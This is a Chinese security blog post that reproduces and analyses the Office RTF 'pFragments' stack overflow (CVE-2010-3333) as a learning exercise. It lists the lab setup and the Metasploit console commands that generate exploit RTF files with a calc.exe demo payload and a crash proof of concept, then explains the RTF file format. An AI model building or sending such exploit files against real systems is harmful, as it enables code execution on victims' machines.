<!DOCTYPE html>
<html lang="zh-Hans">
<head>

    <!--[if lt IE 9]>
        <style>body {display: none; background: none !important} </style>
        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
    <![endif]-->


<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="format-detection" content="telephone=no" />
<meta name="author" content="Sp4n9x" />
<meta name="renderer" content="webkit">
<meta name="google" value="notranslate">



<meta name="description" content="这个漏洞还是《漏洞战争》中的例子，学东西还是要脚踏实地，一步一步学习。而且要每天给自己定个目标，尽自己最大的努力去完成，不要拖拉。我发现自己有拖延症，要努力地去改掉这个坏习惯了。废话不多说，尽自己最大努力，将《漏洞战争》中的漏洞都亲手调一遍，我相信可以学到很多东西。">
<meta name="keywords" content="Stack Overflow,Windows,Microsoft Office,Rtf,FileFormat">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2010-3333复现与分析">
<meta property="og:url" content="http://sp4n9x.github.io/2020/12/20/CVE-2010-3333复现与分析/index.html">
<meta property="og:site_name" content="Sp4n9x&#39;s Blog">
<meta property="og:description" content="这个漏洞还是《漏洞战争》中的例子，学东西还是要脚踏实地，一步一步学习。而且要每天给自己定个目标，尽自己最大的努力去完成，不要拖拉。我发现自己有拖延症，要努力地去改掉这个坏习惯了。废话不多说，尽自己最大努力，将《漏洞战争》中的漏洞都亲手调一遍，我相信可以学到很多东西。">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://sp4n9x.github.io/resources/2020/CVE-2010-3333/pFragements.png">
<meta property="og:image" content="http://sp4n9x.github.io/resources/2020/CVE-2010-3333/SEH异常处理链表示意图.png">
<meta property="og:image" content="http://sp4n9x.github.io/resources/2020/CVE-2010-3333/覆盖SEH劫持控制流示意图.png">
<meta property="og:image" content="http://sp4n9x.github.io/resources/2020/CVE-2010-3333/通用Exploit的栈布局.png">
<meta property="og:image" content="http://sp4n9x.github.io/resources/2020/CVE-2010-3333/补丁安装错误.png">
<meta property="og:image" content="http://sp4n9x.github.io/resources/2020/CVE-2010-3333/补丁前后关键函数对比图.png">
<meta property="og:updated_time" content="2020-12-26T16:16:18.946Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CVE-2010-3333复现与分析">
<meta name="twitter:description" content="这个漏洞还是《漏洞战争》中的例子，学东西还是要脚踏实地，一步一步学习。而且要每天给自己定个目标，尽自己最大的努力去完成，不要拖拉。我发现自己有拖延症，要努力地去改掉这个坏习惯了。废话不多说，尽自己最大努力，将《漏洞战争》中的漏洞都亲手调一遍，我相信可以学到很多东西。">
<meta name="twitter:image" content="http://sp4n9x.github.io/resources/2020/CVE-2010-3333/pFragements.png">

<link rel="apple-touch-icon" href= "/apple-touch-icon.png">


    <link rel="alternative" href="/atom.xml" title="Sp4n9x&#39;s Blog" type="application/atom+xml">



    <link rel="shortcut icon" href="/favicon.ico">



    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">



    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">



    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">


<link rel="stylesheet" href="/css/style.css">



<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">


<title>CVE-2010-3333复现与分析 | Sp4n9x&#39;s Blog</title>

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>

<script>
    var yiliaConfig = {
        fancybox: true,
        animate: true,
        isHome: false,
        isPost: true,
        isArchive: false,
        isTag: false,
        isCategory: false,
        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
        search: true
    }
</script>


    <script>
        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
    </script>



    <script> yiliaConfig.rootUrl = "\/";</script>





    <script>
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "//hm.baidu.com/hm.js?48aad015dbbeb363812643fd03e528c5";
            var s = document.getElementsByTagName("script")[0]; 
            s.parentNode.insertBefore(hm, s);
        })();
    </script>


</head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            <img src="/img/avatar.png" class="animated zoomIn">
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/">Sp4n9x</a></h1>
        </hgroup>

        

        
            <form id="search-form">
            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
            <i class="fa fa-times" onclick="resetSearch()"></i>
            </form>
            <div id="local-search-result"></div>
            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
        


        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                    
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/">主页</a></li>
                        
                            <li><a href="/archives/">所有文章</a></li>
                        
                            <li><a href="/tags/">标签云</a></li>
                        
                            <li><a href="/about/">留言板</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" href="mailto:sp4n9x@qq.com" title="Email"></a>
                            
                                <a class="fa 新浪微博" href="https://weibo.com/u/5721141892" title="新浪微博"></a>
                            
                                <a class="fa GitHub" href="https://github.com/Sp4n9x" title="GitHub"></a>
                            
                                <a class="fa 知乎" href="https://www.zhihu.com/people/pangx-cn/columns" title="知乎"></a>
                            
                                <a class="fa 网易云音乐" href="http://music.163.com/#/user/home?id=439043183" title="网易云音乐"></a>
                            
                            <!--
                            <div id="music163player">
                                <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=250 height=86 src="//music.163.com/outchain/player?type=2&id=535693399&auto=1&height=66">
                                </iframe>
                            </div>
                            -->
                        </ul>
                    </nav>
                </section>
                
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Adobe-Reader/">Adobe Reader</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DNS隐蔽信道通信/">DNS隐蔽信道通信</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/FileFormat/">FileFormat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Got表覆写/">Got表覆写</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kali/">Kali</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Microsoft-Office/">Microsoft Office</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pdf/">Pdf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn/">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ROP/">ROP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Rtf/">Rtf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL注入/">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Stack-Overflow/">Stack Overflow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Ubuntu/">Ubuntu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows/">Windows</a></li></ul>
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a class="main-nav-link switch-friends-link" href="//moxfive.xyz/">MOxFIVE</a>
                    
                    </div>
                </section>
                

                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">Sp4n9x&#39;s 简介</div>
                </section>
                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Sp4n9x</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                <img src="/img/avatar.png" class="animated zoomIn">
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页">Sp4n9x</a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/">主页</a></li>
                
                    <li><a href="/archives/">所有文章</a></li>
                
                    <li><a href="/tags/">标签云</a></li>
                
                    <li><a href="/about/">留言板</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" target="_blank" href="mailto:sp4n9x@qq.com" title="Email"></a>
                            
                                <a class="fa 新浪微博" target="_blank" href="https://weibo.com/u/5721141892" title="新浪微博"></a>
                            
                                <a class="fa GitHub" target="_blank" href="https://github.com/Sp4n9x" title="GitHub"></a>
                            
                                <a class="fa 知乎" target="_blank" href="https://www.zhihu.com/people/pangx-cn/columns" title="知乎"></a>
                            
                                <a class="fa 网易云音乐" target="_blank" href="http://music.163.com/#/user/home?id=439043183" title="网易云音乐"></a>
                            
                        </ul>
            </nav>
        </header>                
    </div>
</nav>
      <div class="body-wrap"><article id="post-CVE-2010-3333复现与分析" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/12/20/CVE-2010-3333复现与分析/" class="article-date">
      <time datetime="2020-12-19T16:00:00.000Z" itemprop="datePublished">2020-12-20</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      CVE-2010-3333复现与分析
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/CVE/">CVE</a>
    </div>


        
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/FileFormat/">FileFormat</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Microsoft-Office/">Microsoft Office</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Rtf/">Rtf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Stack-Overflow/">Stack Overflow</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Windows/">Windows</a></li></ul>
    </div>

        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
      
          
        <blockquote>
<p>这个漏洞还是《漏洞战争》中的例子，学东西还是要脚踏实地，一步一步学习。<br>而且要每天给自己定个目标，尽自己最大的努力去完成，不要拖拉。<br>我发现自己有拖延症，要努力地去改掉这个坏习惯了。<br>废话不多说，尽自己最大努力，将《漏洞战争》中的漏洞都亲手调一遍，我相信可以学到很多东西。<br><a id="more"></a></p>
</blockquote>
<h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>&emsp;&emsp;<code>Microsoft Office</code>是微软发布的非常流行的<code>办公软件套件</code>。<code>CVE-2010-3333</code>(<a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2010/ms10-087" target="_blank" rel="noopener">微软编号：MS10-087</a>)是Microsoft<code>Office XP SP3</code>、<code>Office 2003 SP3</code>、<code>Office 2007 SP2</code>、<code>Office 2010</code>，Mac<code>Office 2004</code>和<code>Office 2008</code>，Mac<code>Office 2011</code>和Mac的<code>Open XML文件格式转换器</code>中的<code>栈溢出漏洞</code>。主要是在处理<code>RTF</code>中的<code>“pFragments”属性</code>时存在栈溢出，导致攻击者可以借助<code>特制的RTF数据</code>执行<code>任意代码</code>，因此该漏洞又名<code>“RTF栈缓冲区溢出漏洞”</code>。</p>
<h2 id="0x10-分析环境"><a href="#0x10-分析环境" class="headerlink" title="0x10 分析环境"></a>0x10 分析环境</h2><table>
<thead>
<tr>
<th style="text-align:center"></th>
<th style="text-align:left">使用的环境</th>
<th style="text-align:left">备注</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">操作系统</td>
<td style="text-align:left">Windows XP <br> Windows 7</td>
<td style="text-align:left">版本号:Windows XP Professional SP3 简体中文版 <br> 版本号:Windows 7 Enterprise SP0 x86 简体中文版</td>
</tr>
<tr>
<td style="text-align:center">虚拟机</td>
<td style="text-align:left">VMWare Workstations</td>
<td style="text-align:left">版本号:15.5.1</td>
</tr>
<tr>
<td style="text-align:center">调试器</td>
<td style="text-align:left">吾爱OllyDbg <br> WinDbg <br> Immunity Debugger</td>
<td style="text-align:left">版本号:2016版 <br> 版本号:v6.12(x86) <br> 版本号:v1.85</td>
</tr>
<tr>
<td style="text-align:center">反汇编器</td>
<td style="text-align:left">IDA Pro</td>
<td style="text-align:left">版本号:7.0</td>
</tr>
<tr>
<td style="text-align:center">漏洞软件</td>
<td style="text-align:left">Microsoft Office Word</td>
<td style="text-align:left">版本号1:Microsoft Office Professional 2003 SP3(11.8169.8172) <br> 版本号2:Microsoft Office Professional 2007 SP0(12.0.4518.1014)</td>
</tr>
</tbody>
</table>
<h2 id="0x20-漏洞复现"><a href="#0x20-漏洞复现" class="headerlink" title="0x20 漏洞复现"></a>0x20 漏洞复现</h2><p>这里用<code>msf</code>来生成用于漏洞利用的<code>exploit样本</code>文件。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">1、Microsoft Office 2003 SP3 English on Windows XP SP3 English</span><br><span class="line">msf &gt; search cve-2010-3333</span><br><span class="line">msf &gt; use exploit/windows/fileformat/ms10_087_rtf_pfragments_bof</span><br><span class="line">msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; <span class="built_in">set</span> target 2</span><br><span class="line">target =&gt; 2</span><br><span class="line">msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; <span class="built_in">set</span> FILENAME CVE-2010-3333(target2,calc).rtf</span><br><span class="line">FILENAME =&gt; CVE-2010-3333(target2,calc).rtf</span><br><span class="line">msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; <span class="built_in">set</span> payload windows/<span class="built_in">exec</span> </span><br><span class="line">payload =&gt; windows/<span class="built_in">exec</span></span><br><span class="line">msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; <span class="built_in">set</span> CMD calc.exe</span><br><span class="line">CMD =&gt; calc.exe</span><br><span class="line">msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; exploit</span><br><span class="line">[*] Creating <span class="string">'CVE-2010-3333(target2,calc).rtf'</span> file ...</span><br><span class="line">[+] CVE-2010-3333(target2,calc).rtf stored at /root/.msf4/<span class="built_in">local</span>/CVE-2010-3333(target2,calc).rtf</span><br><span class="line"></span><br><span class="line">2、Microsoft Office 2007 SP0 English on Windows 7 SP0 English</span><br><span class="line">msf &gt; search cve-2010-3333</span><br><span class="line">msf &gt; use exploit/windows/fileformat/ms10_087_rtf_pfragments_bof</span><br><span class="line">msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; <span class="built_in">set</span> target 5</span><br><span class="line">target =&gt; 2</span><br><span class="line">msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; <span class="built_in">set</span> FILENAME CVE-2010-3333(target5,calc).rtf</span><br><span class="line">FILENAME =&gt; CVE-2010-3333(target5,calc).rtf</span><br><span class="line">msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; <span class="built_in">set</span> payload windows/<span class="built_in">exec</span> </span><br><span class="line">payload =&gt; windows/<span class="built_in">exec</span></span><br><span class="line">msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; <span class="built_in">set</span> CMD calc.exe</span><br><span class="line">CMD =&gt; calc.exe</span><br><span class="line">msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; exploit</span><br><span class="line">[*] Creating <span class="string">'CVE-2010-3333(target5,calc).rtf'</span> file ...</span><br><span class="line">[+] CVE-2010-3333(target5,calc).rtf stored at /root/.msf4/<span class="built_in">local</span>/CVE-2010-3333(target5,calc).rtf</span><br><span class="line"></span><br><span class="line">3、PoC(Crash)</span><br><span class="line">msf &gt; search cve-2010-3333</span><br><span class="line">msf &gt; use exploit/windows/fileformat/ms10_087_rtf_pfragments_bof</span><br><span class="line">msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; <span class="built_in">set</span> FILENAME CVE-2010-3333(target6,Crash).rtf</span><br><span class="line">FILENAME =&gt; CVE-2010-3333(target6,Crash).rtf</span><br><span class="line">msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; <span class="built_in">set</span> target 6</span><br><span class="line">target =&gt; 6</span><br><span class="line">msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; exploit</span><br><span class="line">[*] Creating <span class="string">'CVE-2010-3333(target6,Crash).rtf'</span> file ...</span><br><span class="line">[+] CVE-2010-3333(target6,Crash).rtf stored at /root/.msf4/<span class="built_in">local</span>/CVE-2010-3333(target6,Crash).rtf</span><br></pre></td></tr></table></figure>
<h2 id="0x30-漏洞原理分析"><a href="#0x30-漏洞原理分析" class="headerlink" title="0x30 漏洞原理分析"></a>0x30 漏洞原理分析</h2><h3 id="0x31-RTF文件格式"><a href="#0x31-RTF文件格式" class="headerlink" title="0x31 RTF文件格式"></a>0x31 RTF文件格式</h3><h4 id="1、RTF简介"><a href="#1、RTF简介" class="headerlink" title="1、RTF简介"></a>1、RTF简介</h4><p>&emsp;&emsp;<code>RTF</code>(Rich Text Format)是<code>Microsoft公司</code>为进行<code>文本</code>和<code>图像</code>信息格式的<code>交换</code>而指定的一种<code>文件格式</code>，它适用与不同的<code>设备</code>、<code>操作环境</code>和<code>操作系统</code>。大多数<code>文字处理软件</code>都可以读写<code>某些版本的RTF</code>。</p>
<h4 id="2、RTF的组成"><a href="#2、RTF的组成" class="headerlink" title="2、RTF的组成"></a>2、RTF的组成</h4><h5 id="2-1、RTF的基本元素"><a href="#2-1、RTF的基本元素" class="headerlink" title="2.1、RTF的基本元素"></a>2.1、RTF的基本元素</h5><p>&emsp;&emsp;<code>标准RTF文件</code>只能包含<code>7位ASCII字符</code>，但可以通过<code>转义序列</code>对<code>超出ASCII范围</code>的字符进行编码。由<code>控制字</code>(Control Word)、<code>控制符</code>(Control Symbol)和<code>群组</code>(Group)组成。由于RTF由<code>7位ASCII字符</code>组成，所以可以在大多数<code>基于PC的操作系统</code>之间轻松传输。与大多数<code>明文文件</code>不同，RTF文件<code>不必</code>包含任何<code>回车/换行符</code>(CRLFs)，RTF解析软件应<code>忽略CRLF</code>,除非他们可以用作<code>控制字分隔符</code>。当<code>CRLF</code>出现在<code>主要组</code>边界时，RTF文件<code>更具可读性</code>。</p>
<p><strong><code>1、控制字(Control Word)</code></strong><br>&emsp;&emsp;<code>控制字</code>是RTF用来<code>标记打印控制符</code>和<code>管理文档信息</code>的一种特殊格式的命令，<code>RTF</code>用它作为<code>正文格式</code>的<code>控制代码</code>，每个控制字均以一个<code>反斜杠\</code>开头，并且控制字<code>区分大小写</code>。<code>ASCII字母序列</code>由ASCII字母字符<code>(a~z和A~Z)</code>组成，<code>控制字</code>(也称为关键字)最初应该不包含<code>任何大写字母</code>，但是近年来，大写字母出现在一些<code>较新的的控制字</code>中，<code>控制字的名称</code>不能超过<code>32个字母</code>，而<code>分隔符</code>标志着<code>控制字名称</code>的结束。其格式为<code>“\ASCII字母序列&lt;分隔符&gt;”</code>。</p>
<p><code>&lt;分隔符&gt;</code>可以使以下之一：</p>
<blockquote>
<ul>
<li><code>一个空格</code>。这仅用于分隔控制字，在后续处理中将被忽略。</li>
<li><code>一个数字或者ASCII减号(-)</code>，表示数字参数与控制字关联。随后的数字序列由ASCII数字(通常是以反斜杠开头的另一个控制字)以外的任何字符分隔。参数可以是正数或负数。该数字的值范围名义上为–32768至32767，即带符号的16位整数。少数控制字的取值范围是-2,147,483,648到2,147,483,647，即32位带符号整数。这些控制字包括\binN，\revdttmN，\rsidN相关的控制字以及一些图片属性，例如\bliptagN。这里N代表数字参数。 RTF解析器必须允许最多10位数字，并可选地在前面加上减号。如果定界符是空格，则将其丢弃，也就是说，它不会包含在后续处理中。</li>
<li><code>除字母或数字外的任何字符</code>。在这种情况下，分隔符终止控制字，而不是控制字的一部分。例如反斜杠“\”，表示后面跟着新的控制字或控制符。</li>
</ul>
</blockquote>
<p>&emsp;&emsp;如果用<code>单个空格</code>分隔控制字，则<code>该空格</code>不会出现在<code>文档</code>中(将<code>被忽略</code>)。<code>单个空格</code>分隔符后面的<code>任何字符</code>，包括<code>任何后续空格</code>，将在<code>文档</code>中显示为<code>文本</code>或<code>空格</code>。因此，应仅在<code>必要时</code>使用<code>空格</code>。建议<code>避免使用空格</code>作为<code>分隔RTF语法</code>的一种方法，以使其<code>更易于阅读</code>。您可以使用<code>段落标记</code>(CR，LF或CRLF)来<code>分隔行</code>，而无需更改含义，但包含<code>\binN</code>的<code>目的地</code>除外。</p>
<p>&emsp;&emsp;在此文档中，采用<code>数字参数N</code>的<code>控制字</code>是用<code>N</code>来写的，如<code>\binN</code>所示，除非<code>控制字</code>以<code>显式值</code>出现。唯一的例外是<code>\b</code>(粗体切换)之类的<code>“切换”控制字</code>，它只有<code>两种状态</code>。当此类控制字<code>没有参数</code>或具有<code>非零参数</code>时，控制字将<code>打开属性</code>。当此类控制字的<code>参数为0</code>时，控制字将<code>关闭该属性</code>。例如，<code>\b</code>打开粗体，<code>\b0</code>关闭粗体。在这些<code>切换控制字</code>的定义中，<code>控制字名称</code>后跟一个<code>星号“*”</code>。</p>
<p><strong><code>2、单位(Units)</code></strong><br>&emsp;&emsp;<code>参数N</code>通常指定<code>尺寸</code>。 RTF中用于<code>尺寸的单位</code>可以是<code>点(pts)</code>，<code>half pts</code>，<code>twips</code>，<code>Device-independent</code>字单位，<code>EMU</code>或<code>像素(pixels)</code>，具体取决于<code>控制字</code>。这些单位汇总在下表中：</p>
<table>
<thead>
<tr>
<th style="text-align:left">Units</th>
<th style="text-align:left">Conversions</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Points(pts)</td>
<td style="text-align:left">72/inch</td>
</tr>
<tr>
<td style="text-align:left">Half points</td>
<td style="text-align:left">144/inch</td>
</tr>
<tr>
<td style="text-align:left">Twips</td>
<td style="text-align:left">1440/inch, 20/pt</td>
</tr>
<tr>
<td style="text-align:left">Device-independent</td>
<td style="text-align:left">294912/inch, 4096/pt</td>
</tr>
<tr>
<td style="text-align:left">EMUs</td>
<td style="text-align:left">914400/inch, 36000/mm, 12700/pt, 635/twip</td>
</tr>
<tr>
<td style="text-align:left">Pixels</td>
<td style="text-align:left">typically 96/inch</td>
</tr>
</tbody>
</table>
<p>&emsp;&emsp;<code>EMU(英制单位)</code>用于某些<code>图形参数尺寸</code>(请参见<code>\shp</code>)，<code>像素(Pixels)</code>用于某些<code>位图</code>和<code>图元文件</code>(metafile)尺寸。<code>EMU</code>的精确度为<code>英寸(inch)</code>，<code>毫米(mm)</code>，<code>点(pts)</code>和<code>twips</code>。 RTF中<code>最常用的单位</code>是<code>twips</code>。</p>
<p><strong><code>3、控制符(Control Symbol)</code></strong><br>&emsp;&emsp;<code>控制符</code>由<code>反斜杠</code>和一个<code>非字母字符</code>组成。例如，<code>\〜</code>(反斜杠波浪线)表示一个<code>不间断的空格</code>。控制符<code>没有分隔符</code>，即<code>控制符</code>后面的<code>空格</code>被视为<code>文本</code>，而不是<code>分隔符</code>。</p>
<p><strong><code>4、组(Group)</code></strong><br>&emsp;&emsp;<code>一个组</code>可以由包含在<code>大括号({})</code>内的<code>文本</code>，<code>控制字</code>或<code>控制符</code>组成。<code>左括号({)</code>表示组的开始，<code>右括号(})</code>表示组的结束。<code>每个组</code>指定<code>受组影响的文本</code>以及<code>该文本的不同属性</code>。RTF文件还可以包括<code>字体</code>、<code>样式</code>、<code>屏幕颜色</code>、<code>图片</code>、<code>脚注</code>、<code>注释</code>、<code>页眉</code>和<code>页脚</code>、<code>摘要信息</code>、<code>域</code>、<code>书签</code>，以及文档、区段、段落和<code>字符格式属性</code>，<code>数学运算</code>、<code>图像</code>和<code>对象</code>的组。如果文件中包含<code>字体</code>，<code>文件</code>，<code>样式</code>，<code>颜色</code>，<code>修订标记</code>和<code>摘要信息组</code>以及<code>文档格式属性</code>，则它们必须出现在<code>RTF正文</code>之前的<code>RTF头</code>中。如果<code>未使用</code>任何组的内容，则可以<code>省略该组</code>。以下各节讨论了这些组。使用<code>另一个组中定义的属性</code>的任何组都必须出现在<code>定义这些属性的组</code>之后。例如，<code>颜色和字体属性</code>必须在<code>样式组</code>之前。</p>
<p><strong><code>5、目的地(Destinations)</code></strong><br>&emsp;&emsp;某些<code>控制字</code>(称为<code>目的地</code>)标记了<code>相关文本集合</code>的开始，这些文本可能出现在<code>文档中的另一个位置</code>或<code>目的地</code>。<code>目的地位置</code>也可能包含<code>已使用</code>但根本<code>没有出现在文档中</code>的文本。目的地的<code>示例</code>是<code>\footnote组</code>，其中<code>脚注文本</code>在<code>控制字</code>之后。<code>分页符</code>不能出现在<code>目的地文本</code>中。目的地<code>控制字</code>及其<code>相关文本</code>必须用<code>大括号({})</code>括起来。</p>
<p>&emsp;&emsp;在<code>1987 RTF规范</code>之后添加的<code>目的地</code>，可以带有<code>控制符\*</code>(反斜杠星号)。如果<code>RTF阅读器</code>无法识别<code>目的地控制字</code>，则此<code>控制符</code>标识的<code>目的地</code>相关文本应<code>被忽略</code>。添加新的<code>目的地</code>或<code>组</code>时，<code>RTF编写者</code>应遵循使用<code>此控制符</code>的约定。即使<code>RTF阅读器</code>无法识别<code>目的地</code>，其相关文本也应<code>插入文档中</code>，而<code>目的地</code>不应使用<code>\*</code>。</p>
<p>&emsp;&emsp;<code>组</code>中指定的<code>大多数格式</code>仅影响<code>该组中的文本</code>(包括该组中的<code>嵌套组</code>)。通常，<code>组中的文本</code>会继承<code>外部组中的文本</code>的格式。但是，RTF的Microsoft实现假定<code>脚注</code>，<code>注释</code>，<code>页眉</code>和<code>页脚组</code>(在本规范的后面部分介绍)不继承<code>外部组的格式</code>。因此，为确保<code>正确格式化</code>这些组，应使用<code>\sectd</code>，<code>\pard</code>和<code>\plain</code>控制字将这些<code>组内的格式</code>设置为<code>适当的默认值</code>，然后添加<code>所需的格式</code>。</p>
<p>&emsp;&emsp;<code>控制字</code>，<code>控制符</code>和<code>花括号</code>构成<code>控制信息</code>。文件中的所有<code>其他字符</code>均为<code>纯文本</code>或<code>数据</code>。这是一个示例，其中包含<code>内部组</code>中不存在的<code>纯文本</code>：</p>
<blockquote>
<p>{\rtf1\ansi\deff0<br>{<strong>\fonttbl</strong>{\f0\froman Tms Rmn;}{\f1\fdecor Symbol;}{\f2\fswiss Helv;}}<br>{<strong>\colortbl</strong>;\red0\green0\blue0;\red0\green0\blue255;\red0\green255\blue255;\red0\green255\blue0;\red255\green0\blue255;\red255\green0\blue0;\red255\green255\blue0;\red255\green255\blue255;}<br>{<strong>\stylesheet</strong>{\fs20 \snext0 Normal;}}<br>{<strong>\info</strong>{\author John Doe}{\creatim\yr1990\mo7\dy30\hr10\min48}{\version1}{\edmins0}{\nofpages1}{\nofwords0}{\nofchars0}{\vern8351}}<br>\widoctrl\ftnbj \sectd\linex0\endnhere <strong>\pard</strong>\plain \fs20 <strong>This is plain text.</strong>\par}</p>
</blockquote>
